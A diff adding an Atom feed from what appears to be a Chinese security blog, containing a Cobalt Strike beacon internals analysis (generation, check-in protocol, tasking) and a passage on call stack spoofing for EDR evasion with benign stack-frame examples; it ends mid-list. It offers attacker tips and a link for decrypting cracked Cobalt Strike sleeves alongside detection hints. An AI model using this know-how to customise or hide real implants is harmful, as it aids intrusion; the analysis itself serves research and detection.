@@ -1,0 +1,2903 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://pyroxenites.github.io</id>
+    <title>pyroxenite</title>
+    <updated>2023-05-29T05:25:09.522Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://pyroxenites.github.io"/>
+    <link rel="self" href="https://pyroxenites.github.io/atom.xml"/>
+    <subtitle>温故而知新</subtitle>
+    <logo>https://pyroxenites.github.io/images/avatar.png</logo>
+    <icon>https://pyroxenites.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2023, pyroxenite</rights>
+    <entry>
+        <title type="html"><![CDATA[CobaltStrike简要分析]]></title>
+        <id>https://pyroxenites.github.io/post/cobaltstrike-jian-yao-fen-xi/</id>
+        <link href="https://pyroxenites.github.io/post/cobaltstrike-jian-yao-fen-xi/">
+        </link>
+        <updated>2022-11-18T05:57:09.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="背景">背景</h2>
+<p>cobaltstrike因为其简单的操作，丰富的功能和插件市场，较好的联动性，所以比较受到攻击者的青睐<br>
+这里我们从attck官方图中可以看到CS从Reconnaissance到Impact都有覆盖</p>
+<figure data-type="image" tabindex="1"><img src="https://pyroxenites.github.io/post-images/1667523226987-6a967b93-01cc-409a-944d-5092b097295a.png" alt="" loading="lazy"></figure>
+<blockquote>
+<figure data-type="image" tabindex="2"><img src="https://pyroxenites.github.io/post-images/1667200391270-8a99b7ed-fd85-4bad-97ad-e486cc9602e7.png" alt="" loading="lazy"></figure>
+</blockquote>
+<p>不过随着CS4.4开始，破解难度随着版本更新而提高，到CS4.6版本做了两端分离，把teamserver提取出来做成了原生的二进制文件，以及二进制版本的teamserver也可能会存在多处暗桩，提高破解和二开难度。<br>
+到目前最新版本为CS4.7.2中，算是在保持灵活性、稳定性、可扩展性基础上，添加了BOF功能扩展、剪贴板获取、socks5代理、黑暗主题、等一些功能，而4.7.1和4.7.2这两个小版本则主要是修复了xss-RCE漏洞和漏洞绕过。<br>
+虽然近段时间，伴随着越来越多其他公开C2的兴起，但是，随之而来，也会有使用成本，攻击者需要时间过渡，如sliver，Havoc，如果是BRC4这种商业软件还需要破解成本和泄露时间成本，以及软件开发作者对泄露版本的&quot;惩罚措施&quot;。所以目前CS依然会是攻击者常用的工具之一，以下文章会对默认的CS进行简单分析。</p>
+<h2 id="cs如何生成木马">CS如何生成木马</h2>
+<p>首先我们需要了解，CS几十个功能点放在哪里，比如我们执行console控制台shell whoami，最终谁去执行了这个功能呢，实现地方就是beacon.dll，被控端通过加载beacon.dll去实现CS的功能点，它位于源码包/sleeve的位置<br>
+<img src="https://pyroxenites.github.io/post-images/1667282658162-22ece19e-6563-47ec-a9ba-ccea9d835fad.png" alt="" loading="lazy"><br>
+当然在sleeve存放着很多dll，这些都是反射DLL，主要是去实现CS某个功能点的，这个在后续会提及到<br>
+<img src="https://pyroxenites.github.io/post-images/1667282835976-c4d56c63-37cc-4a1b-9ad7-46438a9b84b7.png" alt="" loading="lazy"><br>
+但是当我们从Jar包中提取出来以后，会发现它是被加密的，是需要key解密的，这个地方就涉及到CS破解问题了<br>
+<img src="https://pyroxenites.github.io/post-images/1667282981206-8c82d287-e26f-4cca-bea0-fb08ba9963e5.png" alt="" loading="lazy"><br>
+当我们拿到对应版本的key去解密，此刻就可以拿到可解析的beacon.dll了</p>
+<blockquote>
+<p><a href="https://github.com/ca3tie1/CrackSleeve">https://github.com/ca3tie1/CrackSleeve</a></p>
+</blockquote>
+<p>我们以现在比较常用的Stagless(无阶段)为例，去看看默认的Stageless EXE是如何生成的，相比于前几年攻击者比较喜欢用的Stage(有阶段)而言，它不需要向teamserver请求下载植入体(beacon.dll)，而是把植入体直接内嵌到里面去，但也是因为内嵌，所以体积会比Stage生成的要更大，但对应的下载导致特征也会减少。<br>
+<img src="https://pyroxenites.github.io/post-images/1667285678075-060e337a-5d56-4017-ae82-479cecf4ac09.png" alt="" loading="lazy"><br>
+我们可以通过关键字定位法，可以看到生成的图形化位于WindowsExecutableStageDialog代码中，然后可以把反编译后的源码放到我们项目的src目录下进行编译便可调试，当我们点击Generate按钮生成木马的时候，源码便会断在dialogAction函数中<br>
+<img src="https://pyroxenites.github.io/post-images/1667286059717-43617e4f-a5f6-4589-9bfb-e2380d23d8b6.png" alt="" loading="lazy"><br>
+该函数首先根据传入的参数，获取了监听器名称、架构，然后根据监听器名称获取到一个ScListener对象，生成这个ScListener对象，则是我们监听器的配置信息，里面包括C2profile的设置，以及通信密钥，通信密钥这边是启动teamserver的时候反序列化.cobaltstrike.beacon_keys文件得到的，而且会在beacon上线那里用得到密钥<br>
+<img src="https://pyroxenites.github.io/post-images/1667356885145-5b6c4871-c83b-4864-83e0-0b98a37309fc.png" alt="" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1667356996261-4537ba7c-5cd6-43e9-82d9-4d646c37efd5.png" alt="" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1667462433620-b2b2bb8e-57ab-4a4a-b397-92bda8638ab9.png" alt="" loading="lazy"><br>
+随后代码我们看到，代码调用了ScListener对象的export方法，进入到export方法中我们可以看到，会根据不同的监听器类型，选择不同的处理方法<br>
+<img src="https://pyroxenites.github.io/post-images/1667357857105-3431fd97-904b-409a-9b12-75fdf135e59e.png" alt="" loading="lazy"><br>
+我们进入到reverse_https类型对应的处理方法中可以看到，代码在根据选择的架构来选择所需要使用的DLL文件，也就是我们上面所提及到的beacon.dll ,而此函数调用的exportBeaconStage方法则是对C2profile的处理，pe.process则是对PE格式等一些数据进行处理<br>
+<img src="https://pyroxenites.github.io/post-images/1667357921636-bfaa9d52-3ff0-45dd-80ff-542ccff840b2.png" alt="" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1667358073911-69e892be-9566-4d87-82fe-c35cca62b532.png" alt="" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1667358167359-3e040562-48e4-47b5-9fb5-a499a6c1ea91.png" alt="" loading="lazy"><br>
+这里我们也可以在exportBeaconStage函数中输出一下Path过后的DLL是什么样子，拿到以后可以方便我们后续的观察<br>
+<img src="https://pyroxenites.github.io/post-images/1667370954291-fc847773-00aa-4d8a-a515-a39c18ea570b.png" alt="" loading="lazy"><br>
+以上流程就是简单梳理一下ScListener.export方法做了那些事情，export函数完成以后便会返回beacon处理以后字节数组<br>
+<img src="https://pyroxenites.github.io/post-images/1667358306143-c5c45b83-ed60-4bb0-9fb6-f46c1d2c40fd.png" alt="" loading="lazy"><br>
+随后便是根据输入的文件类型，输入默认文件名，并弹出保存窗口<br>
+<img src="https://pyroxenites.github.io/post-images/1667358504174-e0ade4bd-e32b-46eb-b242-8e0b7a2813cc.png" alt="" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1667358630567-5e7a3496-646c-409e-abd2-3e8be19a81d5.png" alt="" loading="lazy"><br>
+随后我们点击保存按钮的时候，它就会进入dialogResult方法下<br>
+<img src="https://pyroxenites.github.io/post-images/1667370037312-b638011a-01ec-45db-a6a7-bd8054f75d45.png" alt="" loading="lazy"><br>
+因为在上面dialogAction函数中，我们只是获取到了处理好后的beacon.dll，还有没有生成beacon.exe，在收集到对应的架构以后，便会进入到对应的patchArtifact函数中，这里主要是将beacon的字节数组Path到artifact64big.exe这个启动器里面。随后便会生成beacon.exe，便可正常启动上线了。</p>
+<blockquote>
+<p>PS:对于上述的Path操作，如果拥有源码和开发环境，以及软件目的是自用的话，其实可以手动，但也会很麻烦</p>
+</blockquote>
+<p>如果需要对这种不开源默认生成的Beacon以及其他公开形式的Beacon进行查杀的话，提取静态强特征即可，提取到的就可以用于静态扫描和内存扫描，当然CS也有相应的解决措施。<br>
+<img src="https://pyroxenites.github.io/post-images/1667456362806-ec852c79-8702-41d4-aaed-bb8bfb721446.png" alt="" loading="lazy"><br>
+对于个性化来说，WindowsExecutableStageDialog是生成木马的地方，也可以添加一下个性化以后的木马，相当于自动化处理C2profile配置以及IP和端口处理问题。</p>
+<h2 id="cs如何上线木马">CS如何上线木马</h2>
+<p>当我们双击beacon.exe上线的时候，因为我们使用的payload是HTTP协议，所以可以用Proxifier+burp的组合去观察数据包。<br>
+当我们点击时候，beacon.exe会发送一个数据包，但是CS控制台并没有任何反应<br>
+<img src="https://pyroxenites.github.io/post-images/1667445005266-373ca16d-0819-4f16-8123-d649b15bf7ad.png" alt="" loading="lazy"><br>
+但当我们Forward这个数据包以后会发现CS控制台会输出目标信息，那么第一个数据包就可以猜测为上线数据包，里面包含了被控主机的信息，而且除了Cookie被加密以后，其他明文地方并没有看到上线信息，那么可以继续猜测Cookie是存储beacon获取到数据的地方。<br>
+<img src="https://pyroxenites.github.io/post-images/1667445025813-21864603-c397-4b4b-bef5-d3d4e5192808.png" alt="" loading="lazy"><br>
+随后每次心跳时间都会发送一个数据包，通过这个我们可以基本看到beacon和teamserver的通信方式。<br>
+这里我们可以对比着WBGlIl师傅逆向出来的源码进行更好理解，beacon是如何对获取到的数据进行处理的<br>
+<img src="https://pyroxenites.github.io/post-images/1667467663188-0f089ffc-3dc1-44af-b22a-e33c407d45c9.png" alt="" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1667465300348-8325c76e-10ef-45b4-aedf-6b177b921816.png" alt="" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1667465454439-b1fc39e9-9f2b-447f-9fab-af150a7cc4f8.png" alt="" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1667465237902-36c43791-61dd-46ea-a676-aa8b7329b2f9.png" alt="" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1667465478877-48276322-2d10-4659-a152-4d95801d04d9.png" alt="" loading="lazy"><br>
+可以看到分为了三部分，第一个是标识符(48879)，第二个是数据大小，第三个就是数据本身，数据中放入了随机生成的AES密钥(16字节)+ANSI(2)+OEM(2)+随机生成的beaconID(4)+当前进程PID(4)+端口信息+一些本机信息<br>
+随后对元数据进行RSA加密，最后发送数据的时候bases64编码，最后得到要发送数据包。<br>
+返回teamserver端，处理地方在WebServer类的serve方法中，这边我们直接看代码对元数据的解析操作<br>
+可以看到在decrypt函数中初始化私钥，然后解密，接着判断标志数48879，如果不相等则解密失败，然后看数据长度，如果大于117则失败，随后在process_beacon_metadata读取前16字节为后续AES的key做准备，又读取了4位字节去设置WindowsCharsets，随后初始化BeaconEntry，并从元数据当中不断取值填写信息<br>
+<img src="https://pyroxenites.github.io/post-images/1667526059813-763323a2-2bb1-4bb9-9273-b148031ae5a6.png" alt="" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1667527508648-9704db55-6d91-4fb8-8ea2-4a5268173538.png" alt="" loading="lazy"><br>
+对于可实现的CS协议，可以用任何语言去个性化beacon，也可以用于欺骗防御，beacon端可以理解teamserver发送的数据，teamserver又可以正常解析到beacon端获取到的数据<br>
+如果需要对默认的CS上线流量进行检测的话，可以根据其在源码/resources/default.profile配置就可以进行检测，还有就是对公开C2profile的信息收集<br>
+<img src="https://pyroxenites.github.io/post-images/1667461549861-3d2d972d-4728-403d-bf93-4da1130c840b.png" alt="" loading="lazy"><br>
+在默认beacon.exe点击上线的时候，就留下MSSE命令管道的痕迹，也算是在上线阶段检测吧<br>
+<img src="https://pyroxenites.github.io/post-images/1667522881127-68e79e7d-3624-41ea-863d-fd131df6d52f.png" alt="" loading="lazy"></p>
+<h2 id="cs如何执行功能">CS如何执行功能</h2>
+<p>这边主要讲解一下，当我们传输命令的时候，beacon端是如何去运行的。<br>
+在CS中每一个功能都一个单独的功能号，teamserver靠返回功能让beacon端理解去执行什么任务，这个在我们上面输出的DLL中也可以看到痕迹。<br>
+<img src="https://pyroxenites.github.io/post-images/1667469573389-beb53ce7-0dda-40e1-bf0e-4cd92de20f34.png" alt="" loading="lazy"><br>
+这里我们可以借助DarkRay师傅的代码进行理解<br>
+这边可以看到发送上线和心跳请求包以后，解析teamserver返回的消息体，判断是否存在任务，然后对消息体进行解析，取出要任务号和执行参数，随后根据任务号进行判断要执行哪一个任务函数<br>
+<img src="https://pyroxenites.github.io/post-images/1667521562849-e8a48427-ac6a-49ad-8656-4968839294f3.png" alt="" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1667522526739-f47f3024-fec1-4c42-bddf-0938105818d1.png" alt="" loading="lazy"><br>
+而在控制端可以看到，当我们在Console中输入命令，如shell whoami回车后，会进入BeaconConsole进行处理，根据字符串去判断要执行的任务<br>
+<img src="https://pyroxenites.github.io/post-images/1667522684628-1f033081-334a-4348-9bc0-dc61a9d80696.png" alt="" loading="lazy"><br>
+接着就会去TaskBeacon中构造这个任务，每个任务都是任务号的形式去发送，如sleep 4，就是给客户端发送4，这里是shell，一般会发送任务号78<br>
+<img src="https://pyroxenites.github.io/post-images/1667522708077-2231f514-3aaa-4c93-af1d-17ff18908871.png" alt="" loading="lazy"><br>
+beacon接收到任务后就会调用cmd去执行我们的命令，随后返回命令结果<br>
+<img src="https://pyroxenites.github.io/post-images/1667522764173-d7adb83d-5c85-46ba-949d-b1d6b86eeeda.png" alt="" loading="lazy"></p>
+<p>对于检查来说，功能都是带有目的性的，也就是行为检测，上面也提及到过sleeve存储着各种反射DLL，这个就是功能执行的时候使用的。</p>
+<blockquote>
+<p>这种方式，既可以减少beacon端的体积，也可以减少beacon端的特征函数，而且还可以让社区开发出自己想要的功能，最后创建傀儡进程虽然现在查杀的比较厉害，但是也可以保持住beacon的稳定性。</p>
+</blockquote>
+<p>比如这里我们以常见的Execute-assembly功能为例<br>
+在代码中我们可以看到，当我们输入指令的时候实际运行ExecuteAssemblyJob的spawn方法，这个方法可以定位到ExecuteAssemblyJob父类的方法<br>
+<img src="https://pyroxenites.github.io/post-images/1667527638590-20bb10f1-073a-4b65-9094-9fb67b893b1b.png" alt="" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1667527643271-2fc94f93-74d9-4eca-b609-2059adaa4f1c.png" alt="" loading="lazy"><br>
+看到首先它会获取到反射DLL(invokeassembly.dll)，然后获取到它的 ReflectiveLoader函数，接着就开始了任务的构建,随后还会根据C2profile是否需要去进行修复和混淆<br>
+<img src="https://pyroxenites.github.io/post-images/1667527664287-f446e508-21e1-4e74-adea-9095aa28c0c5.png" alt="" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1667527687238-006b4fc1-c41f-4674-8c56-5f66db6898ff.png" alt="" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1667527672537-9a6398c7-095d-4e24-adbd-63368588729b.png" alt="" loading="lazy"></p>
+<blockquote>
+<p>最后会根据一个的格式打包发送给beacon.dll，rundll32创建傀儡进程，然后向傀儡反射注入DLL，反射DLL实现内存加载.Net程序集</p>
+</blockquote>
+<p><img src="https://pyroxenites.github.io/post-images/1667528454054-414e1878-39b3-44be-9af4-3ee6bd8496ff.png" alt="" loading="lazy"><br>
+我们常见的logonpasswords、portscan也是这个套路，可以以此去做一个检测，这个点可以改动，我们也可以收集<br>
+<img src="https://pyroxenites.github.io/post-images/1667529051916-66c46a19-f1ec-4e89-8bd2-51a9478a7e56.png" alt="" loading="lazy"><br>
+另外对于攻击者来说，个性化beacon以后，就可以在BeaconConsole去编写自己想要实现的功能，不过功能最好集成在隐蔽存活这个点上面。</p>
+<h2 id="参考来源">参考来源</h2>
+<ol>
+<li><a href="https://bbs.pediy.com/user-home-718877.htm">https://bbs.pediy.com/user-home-718877.htm</a></li>
+<li><a href="https://github.com/WBGlIl/ReBeacon_Src">https://github.com/WBGlIl/ReBeacon_Src</a></li>
+<li><a href="https://github.com/darkr4y/geacon">https://github.com/darkr4y/geacon</a></li>
+</ol>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[调用栈欺骗]]></title>
+        <id>https://pyroxenites.github.io/post/diao-yong-zhan-qi-pian/</id>
+        <link href="https://pyroxenites.github.io/post/diao-yong-zhan-qi-pian/">
+        </link>
+        <updated>2022-10-17T09:44:04.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>CSS(Call Stack Spoofing)<br>
+对抗场景:</p>
+<ol>
+<li>用在线程函数里，尤其是需要长期运行的线程函数。因为创建新线程基本都是会被监控的，中高端EDR会尝试遍历调用栈来查找敏感返回地址及扫描相关内存，所以CSS是有必要的 （此场景下使用比较重要）
+<ul>
+<li>对应的检测手法可参考:<a href="https://github.com/hasherezade/pe-sieve/wiki/4.9.-Scan-threads-callstack-(threads)">https://github.com/hasherezade/pe-sieve/wiki/4.9.-Scan-threads-callstack-(threads)</a></li>
+</ul>
+</li>
+<li>用在敏感API调用链中，主要是在调用一些非syscall的API和在实现DirectSyscall之前的API调用链中</li>
+</ol>
+</blockquote>
+<ul>
+<li>极个别高端EDR还会通过栈回溯的方式来确定系统调用的发起方是否是ntdll.dll和kernel32.dll等系统dll</li>
+</ul>
+<blockquote>
+<ul>
+<li>正常程序:主程序模块-&gt;kernel32.dll-&gt;ntdll.dll-&gt;syscall,这样当0环执行结束返回3环的时候，这个返回地址应该是在ntdll所在的地址范围之内</li>
+<li>直接进行系统调用:此时当ring0返回的时候，rip将会是你的主程序模块内，而并不是在ntdll所在的范围内</li>
+</ul>
+</blockquote>
+<h2 id="函数调用">函数调用</h2>
+<blockquote>
+<p>操作系统在加载可执行文件到内存运行之前需要完成许多准备工作，其中一项重要的任务是将代码和数据存储在内存中的适当位置，并分配和初始化必要的堆栈</p>
+</blockquote>
+<p>进程在内存中布局主要分为4个区域: 代码区, 数据区, 堆和栈.</p>
+<figure data-type="image" tabindex="1"><img src="https://cdn.nlark.com/yuque/0/2023/jpeg/8363097/1672794843411-03118115-254e-4059-b4bb-9f5b214e28cb.jpeg#averageHue=%23f9f8ee&amp;clientId=ue10bd05a-aa60-4&amp;from=paste&amp;height=628&amp;id=ud5d7c465&amp;originHeight=942&amp;originWidth=1314&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=91316&amp;status=done&amp;style=none&amp;taskId=ub8897e8e-e34f-4d4e-8ad4-8f4633801ec&amp;title=&amp;width=876" alt="未命名文件.jpg" loading="lazy"></figure>
+<h3 id="函数调用栈">函数调用栈</h3>
+<h4 id="作用">作用</h4>
+<ol>
+<li>保存函数的局部变量;</li>
+<li>向被调用函数传递参数;</li>
+<li>返回函数的返回值;</li>
+<li>保存函数的返回地址. (返回地址是指从被调用函数返回后调用者应该继续执行的指令地址)</li>
+</ol>
+<p>函数执行过程中会使用一块栈内存（栈帧）保存上述的值，在发生函数调用时，被调用函数的栈帧会被压入栈上，执行完后再弹出，因此栈的大小会根据函数调用的层级增加而增大，随函数的返回而缩小。</p>
+<h4 id="与栈相关的寄存器">与栈相关的寄存器</h4>
+<ul>
+<li>rsp寄存器, 始终指向函数调用栈栈顶
+<ul>
+<li>32位对应ESP寄存器</li>
+</ul>
+</li>
+<li>rbp寄存器, 一般用来指向函数栈帧的开始位置
+<ul>
+<li>32位对应EBP寄存器</li>
+</ul>
+</li>
+</ul>
+<p>下面举例说明，函数调用栈以及rsp/rbp与栈之间的关系是什么<br>
+函数调用链: A()-&gt;B()-&gt;C(), 并且正在执行函数 C().<br>
+<img src="https://cdn.nlark.com/yuque/0/2023/jpeg/8363097/1672796316601-b0b428fd-ad76-4866-88bd-db541711d202.jpeg#averageHue=%23faf9f3&amp;clientId=ue10bd05a-aa60-4&amp;from=paste&amp;height=641&amp;id=ucbf280f9&amp;originHeight=962&amp;originWidth=1480&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=130627&amp;status=done&amp;style=none&amp;taskId=uf439de80-709d-4a51-ad60-7d4e2bdc8b0&amp;title=&amp;width=986.6666666666666" alt="未命名文件.jpg" loading="lazy"><br>
+随着程序的运行, 如果 C, B 两个函数都执行完成并返回到A函数继续执行, 则栈的状态如下:<br>
+<img src="https://cdn.nlark.com/yuque/0/2023/jpeg/8363097/1672796538837-e6fde28b-a1fe-445d-9ab8-0ffe31a4cac1.jpeg#averageHue=%23fbfbfb&amp;clientId=ue10bd05a-aa60-4&amp;from=paste&amp;height=584&amp;id=uca5fed30&amp;originHeight=876&amp;originWidth=859&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=51991&amp;status=done&amp;style=none&amp;taskId=u95a80b47-1754-4926-a49a-3cce220e084&amp;title=&amp;width=572.6666666666666" alt="未命名文件.jpg" loading="lazy"></p>
+<h4 id="一些汇编指令">一些汇编指令</h4>
+<ul>
+<li>call/ret</li>
+</ul>
+<pre><code>call 目标地址
+在执行函数调用时，CPU会将rip寄存器的值压入栈中并将rip设置为目标地址，从而使CPU能够跳转到目标地址执行指令。
+ret
+用于从被调用函数返回到调用函数，实现原理是将call指令压入栈中的“返回地址”弹出并给rip寄存器。
+</code></pre>
+<ul>
+<li>push/pop</li>
+</ul>
+<pre><code>push 源操作数
+向堆栈中压入数据，压入数据后会提升栈顶指针，提升多少取决于压入数据的数据宽度
+pop 目标操作数
+释放压入堆栈中的数据，释放数据后会下降栈顶指针，下降多少取决于释放数据的数据宽度
+</code></pre>
+<ul>
+<li>leave</li>
+</ul>
+<pre><code>leave 指令没有操作数, 它一般放在函数的尾部 ret 指令之前, 用于调整 rsp 和 rbp, 这条指令相当于:
+mov %rbp, %rsp
+pop %rbp
+</code></pre>
+<h4 id="c语言函数栈帧过程">C语言函数栈帧过程</h4>
+<pre><code class="language-cpp">#include &lt;stdio.h&gt;
+
+int sum(int a, int b)
+{
+    int s = a + b;
+    return s;
+}
+
+int main(int argc, char* argv[])
+{
+    __asm{
+		mov eax, eax
+    }
+    int n = sum(1, 2);
+    printf(&quot;n: %d\n&quot;, n);
+    return 0;
+}
+</code></pre>
+<p>在sum函数还没有调用的时候堆栈的位置<br>
+<img src="https://pyroxenites.github.io/post-images/1672882606087-8be17e24-a997-4244-9964-4d1fe5ca23ab.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1672882618768-3d5393be-81d7-4804-891d-887ee0481112.png" alt="image.png" loading="lazy"></p>
+<pre><code class="language-cpp">002F186D  push        2
+002F186F  push        1  
+002F1871  call        _sum (02F1299h)  
+002F1876  add         esp,8  
+002F1879  mov         dword ptr [n],eax 
+</code></pre>
+<pre><code>push        2
+</code></pre>
+<p>把2压倒堆栈中，ESP地址变成0133FBB0，其值为2<br>
+<img src="https://pyroxenites.github.io/post-images/1672883173923-955f6698-026f-4a15-b6f9-992ef6635a82.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1672883249654-47dfabf3-7846-4494-b720-3739a643f2a8.png" alt="image.png" loading="lazy"></p>
+<pre><code>push        1 
+</code></pre>
+<p>把2压倒堆栈中，ESP地址变成0133FBAC，其值为1<br>
+<img src="https://pyroxenites.github.io/post-images/1672883317578-19a84439-4910-4768-9512-a1cfbefbed0d.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1672883342437-91cd87f8-d426-43ae-8e68-b09a7cf22fce.png" alt="image.png" loading="lazy"></p>
+<pre><code>call        _sum (02F1299h) 
+</code></pre>
+<p>把下一条指令的地址002F1876压入到堆栈中，并跳到函数执行地址<br>
+<img src="https://pyroxenites.github.io/post-images/1672883755926-8b7eafad-b115-43dd-999d-e532967b9836.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1672883784410-df123155-1473-40ef-bca5-0e9b6b862bbd.png" alt="image.png" loading="lazy"><br>
+进入到sum函数的汇编</p>
+<pre><code class="language-cpp">002F1960  push        ebp  
+002F1961  mov         ebp,esp  
+002F1963  sub         esp,0CCh  
+002F1969  push        ebx  
+002F196A  push        esi  
+002F196B  push        edi  
+002F196C  lea         edi,[ebp-0Ch]  
+002F196F  mov         ecx,3  
+002F1974  mov         eax,0CCCCCCCCh
+</code></pre>
+<pre><code>push        ebp  
+</code></pre>
+<p>将ebp寄存器的值推送到堆栈中,ESP为0133FBA4</p>
+<pre><code>mov         ebp,esp  
+</code></pre>
+<p>将esp寄存器的值移到ebp寄存器中，esp和ebp相等了<br>
+<img src="https://pyroxenites.github.io/post-images/1672885061462-f41dcd2b-cc4b-4f6f-942e-0dec9d3a5dd4.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1672885095422-4020383a-261d-4f72-9f10-6512fe98b46e.png" alt="image.png" loading="lazy"></p>
+<pre><code>sub         esp,0CCh
+</code></pre>
+<p>从esp寄存器的值中减去0CCh(十进制为204)，给新的函数堆栈分配内存<br>
+<img src="https://pyroxenites.github.io/post-images/1672885414670-bf552ab3-978a-4c13-9ad0-5ee7526896a7.png" alt="image.png" loading="lazy"></p>
+<pre><code>push        ebx  
+push        esi  
+push        edi
+</code></pre>
+<p>将ebx、esi和edi寄存器的值推到堆栈中。这些寄存器在x86汇编中经常被用作通用寄存器，并被保存，以便以后可以恢复它们的值<br>
+<img src="https://pyroxenites.github.io/post-images/1672885979406-f391569d-fe94-4b4e-8ed7-43069570d0a5.png" alt="image.png" loading="lazy"></p>
+<pre><code>00EF185F  mov         ecx,3  
+00EF1864  mov         eax,0CCCCCCCCh
+00EF1869  rep stos    dword ptr es:[edi]
+</code></pre>
+<p>在缓冲区添加0CCCCCCCCh</p>
+<h2 id="栈展开">栈展开</h2>
+<blockquote>
+<p>stack unwinding</p>
+</blockquote>
+<p>在抛出异常时，会暂停当前函数的执行并寻找匹配的 catch 子句来处理该异常。首先会检查 throw 语句是否在 try 块内，如果是的话，会检查与该 try 块相关的 catch 子句，看看是否能处理该异常。如果不能处理，则会退出当前函数，释放该函数的内存并销毁局部对象，并在调用该函数的上层函数中继续查找可以处理该异常的 catch 子句，直到找到为止。这一过程被称为栈展开。在处理完该异常的 catch 子句之后，程序会从 catch 子句之后的位置继续执行。<br>
+在其中需要注意的是</p>
+<blockquote>
+<ol>
+<li>为局部对象调用析构函数</li>
+</ol>
+</blockquote>
+<p>在展开栈的过程中，局部对象所占用的内存会被释放，并执行类型局部对象的析构函数。但是，要注意：如果在一个块中使用 new 动态分配内存，并且在释放该资源之前发生异常，导致块因异常退出，那么栈展开期间不会释放该资源，编译器也不会删除指针，导致内存泄露。</p>
+<blockquote>
+<ol start="2">
+<li>析构函数应该从不抛出异常</li>
+</ol>
+</blockquote>
+<p>在栈展开时，如果析构函数抛出未经处理的异常，将导致调用标准库的 terminate 函数。这通常会导致程序调用 abort 函数并非正常退出。因此，析构函数永远不应该抛出异常。</p>
+<blockquote>
+<ol start="3">
+<li>异常与构造函数</li>
+</ol>
+</blockquote>
+<p>如果在构造函数对象时发生异常，此时该对象可能只是被部分构造，要保证能够适当的撤销这些已构造的成员</p>
+<blockquote>
+<ol start="4">
+<li>未捕获的异常将会终止程序</li>
+</ol>
+</blockquote>
+<p>不能不处理异常。如果找不到匹配的catch，程序就会调用库函数terminate。</p>
+<pre><code class="language-cpp">#include &lt;string&gt;
+#include &lt;iostream&gt;
+
+using namespace std;
+
+class MyException{};
+class Dummy {
+public:
+    // 构造函数
+    Dummy(string s) : MyName(s) { PrintMsg(&quot;Created Dummy:&quot;); }
+    // 拷贝构造
+    Dummy(const Dummy&amp; other) : MyName(other.MyName){ PrintMsg(&quot;Copy created Dummy:&quot;); }
+    // 析构函数
+    ~Dummy(){ PrintMsg(&quot;Destroyed Dummy:&quot;); }
+    void PrintMsg(string s) { cout &lt;&lt; s  &lt;&lt; MyName &lt;&lt;  endl; }
+    string MyName;
+    int level;
+};
+
+void C(Dummy d, int i) {
+    cout &lt;&lt; &quot;Entering Function C&quot; &lt;&lt; endl;
+    d.MyName = &quot; C&quot;;
+    throw MyException();
+
+    cout &lt;&lt; &quot;Exiting Function C&quot; &lt;&lt; endl;
+}
+
+void B(Dummy d, int i) {
+    cout &lt;&lt; &quot;Entering Function B&quot; &lt;&lt; endl;
+    d.MyName = &quot; B&quot;;
+    C(d, i + 1);
+    cout &lt;&lt; &quot;Exiting Function B&quot; &lt;&lt; endl;
+}
+
+void A(Dummy d, int i) {
+    cout &lt;&lt; &quot;Entering Function A&quot; &lt;&lt; endl;
+    d.MyName = &quot; A&quot; ;
+  //  Dummy* pd = new Dummy(&quot;new Dummy&quot;); //Not exception safe!!!
+    B(d, i + 1);
+ //   delete pd;
+    cout &lt;&lt; &quot;Exiting FunctionA&quot; &lt;&lt; endl;
+}
+
+int main() {
+    cout &lt;&lt; &quot;Entering main&quot; &lt;&lt; endl;
+    try {
+        Dummy d(&quot; M&quot;);
+        A(d,1);
+    }
+    catch (MyException&amp; e) {
+        cout &lt;&lt; &quot;Caught an exception of type: &quot; &lt;&lt; typeid(e).name() &lt;&lt; endl;
+    }
+    cout &lt;&lt; &quot;Exiting main.&quot; &lt;&lt; endl;
+    return 0;
+}
+</code></pre>
+<p>运行效果:<br>
+<img src="https://pyroxenites.github.io/post-images/1672891054781-1ade1ce1-36e5-47ee-8726-b84f07665303.png" alt="image.png" loading="lazy"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/jpeg/8363097/1672905630196-1366ad60-e6d8-40f8-a0b3-d03143a3f4e5.jpeg#averageHue=%23fafafa&amp;clientId=u33da875c-514d-4&amp;from=paste&amp;height=396&amp;id=ud1f877fd&amp;originHeight=594&amp;originWidth=724&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=31785&amp;status=done&amp;style=none&amp;taskId=u7f58154c-38e3-4c00-b1e6-08203b3c374&amp;title=&amp;width=482.6666666666667" alt="未命名文件.jpg" loading="lazy"><br>
+程序执行将从 C 中的 throw 语句跳转到 main 中的 catch 语句，并在此过程中展开每个函数。</p>
+<blockquote>
+<ol>
